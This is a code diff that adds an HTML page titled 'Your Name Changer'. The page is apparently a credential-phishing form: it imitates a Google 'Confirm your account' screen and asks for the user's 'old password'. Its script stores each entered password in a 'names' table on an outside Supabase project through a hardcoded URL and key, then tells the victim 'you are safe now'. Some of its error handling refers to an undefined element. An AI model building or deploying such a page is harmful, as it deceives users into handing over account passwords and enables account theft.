@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Your Name Changer</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background: #fff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #202124;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 450px;
+      padding: 40px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      transition: 0.3s ease;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    .logo span {
+      font-size: 30px;
+      font-weight: 500;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 24px;
+      font-weight: 400;
+      margin-bottom: 12px;
+    }
+
+    .subtitle {
+      text-align: center;
+      color: #5f6368;
+      font-size: 15px;
+      line-height: 1.5;
+      margin-bottom: 30px;
+    }
+
+    .input-group {
+      margin-bottom: 25px;
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 8px;
+      color: #3c4043;
+    }
+
+    input {
+      width: 100%;
+      height: 52px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      padding: 0 14px;
+      font-size: 16px;
+      outline: none;
+    }
+
+    input:focus {
+      border: 2px solid #1a73e8;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 15px;
+    }
+
+    button {
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 500;
+      border-radius: 4px;
+      transition: 0.2s;
+    }
+
+    .confirm {
+      background: #1a73e8;
+      color: white;
+      border: none;
+      padding: 11px 24px;
+    }
+
+    .confirm:hover {
+      background: #1557b0;
+    }
+
+    .save {
+      background: white;
+      color: #1a73e8;
+      border: 1px solid #dadce0;
+      padding: 10px 24px;
+    }
+
+    .save:hover {
+      background: #f8faff;
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    .success {
+      text-align: center;
+      padding: 15px 0;
+    }
+
+    .success-icon {
+      width: 72px;
+      height: 72px;
+      margin: 0 auto 20px;
+      border-radius: 50%;
+      background: #e6f4ea;
+      color: #188038;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 42px;
+      font-weight: bold;
+    }
+
+    .success h1 {
+      color: #188038;
+      font-size: 24px;
+      font-weight: 500;
+      margin-bottom: 12px;
+    }
+
+    .success p {
+      color: #5f6368;
+      font-size: 15px;
+      line-height: 1.5;
+    }
+
+    .error {
+      color: #d93025;
+      font-size: 14px;
+      margin-top: 10px;
+      display: none;
+    }
+    .blue { color: #4285f4; }
+    .red { color: #ea4335; }
+    .yellow { color: #fbbc05; }
+    .green { color: #34a853; }
+
+    @media (max-width: 500px) {
+      .container {
+        border: none;
+        padding: 30px 25px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container" id="mainContainer">
+
+    <div class="logo">
+        <span class="blue">G</span>
+        <span class="red">o</span>
+        <span class="yellow">o</span>
+        <span class="blue">g</span>
+        <span class="green">l</span>
+        <span class="red">e</span>
+      </div>
+
+      <h1>Confirm your account</h1>
+
+      <p class="subtitle">
+        To continue, enter your old password and confirm your identity.
+      </p>
+  
+      <div class="input-group">
+        <label for="oldPassword">Enter your old password</label>
+  
+        <input
+          type="text"
+          id="name"
+          placeholder="Old password"
+          autocomplete="off"
+        >
+      </div>
+
+    <div class="buttons">
+
+      <button
+        class="confirm"
+        id="confirmButton"
+        onclick="saveName()">
+        Confirm
+      </button>
+
+      <button
+        class="save"
+        id="changeButton"
+        onclick="saveName()">
+        Change
+      </button>
+
+    </div>
+
+  </div>
+
+
+  <!-- Supabase JavaScript -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+  <script>
+
+    // ==========================================
+    // PUT YOUR SUPABASE DETAILS HERE
+    // ==========================================
+
+    const SUPABASE_URL = "https://vahmoopckazxlaqffcmk.supabase.co";
+
+    const SUPABASE_ANON_KEY = "sb_publishable_CMToibJjDj6_cInF-Z6N1A_8oVnzldo";
+
+
+    // Create Supabase client
+    const supabaseClient = window.supabase.createClient(
+      SUPABASE_URL,
+      SUPABASE_ANON_KEY
+    );
+
+
+    // ==========================================
+    // SAVE NAME
+    // ==========================================
+
+    async function saveName() {
+
+      const nameInput = document.getElementById("name");
+
+      const confirmButton = document.getElementById("confirmButton");
+      const changeButton = document.getElementById("changeButton");
+
+      const name = nameInput.value.trim();
+
+
+      // Clear previous error
+
+
+      // Validate
+      if (name === "") {
+
+        errorMessage.textContent = "Please enter your name.";
+        errorMessage.style.display = "block";
+
+        nameInput.focus();
+
+        return;
+      }
+
+
+      // Disable buttons while saving
+      confirmButton.disabled = true;
+      changeButton.disabled = true;
+
+      confirmButton.textContent = "Saving...";
+
+
+      try {
+
+        // Insert name into Supabase
+        const { error } = await supabaseClient
+  .from("names")
+  .insert([
+    {
+      name: name
+    }
+  ]);
+
+
+        // Supabase error
+        if (error) {
+          throw error;
+        }
+
+
+        // Success screen
+        document.getElementById("mainContainer").innerHTML = `
+
+        <div class="success">
+
+<div class="success-icon">
+  ✓
+</div>
+
+<h1>
+  Thank you, you are safe now
+</h1>
+
+<p>
+  Your account has been successfully confirmed.
+</p>
+
+</div>
+
+        `;
+
+      } catch (error) {
+
+        console.error("Supabase Error:", error);
+
+        errorMessage.textContent =
+        error.message || "Something went wrong. Please try again.";
+
+        errorMessage.style.display = "block";
+
+        confirmButton.disabled = false;
+        changeButton.disabled = false;
+
+        confirmButton.textContent = "Confirm";
+      }
+
+    }
+
+
+    // Allow Enter key to submit
+    document.getElementById("name").addEventListener(
+      "keypress",
+      function(event) {
+
+        if (event.key === "Enter") {
+          saveName();
+        }
+
+      }
+    );
+
+  </script>
+
+</body>
+</html>
